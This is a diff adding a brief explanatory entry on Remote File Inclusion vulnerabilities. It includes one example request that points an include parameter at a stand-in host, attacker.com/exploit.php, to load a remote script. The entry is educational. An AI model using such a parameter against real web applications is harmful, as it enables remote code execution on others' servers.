@@ -1,0 +1,5 @@
+Remote File Inclusion
+Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.
+Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like include.php?page=http://attacker.com/exploit.php, an attacker can replace the URL with a path to a malicious script.
+
+
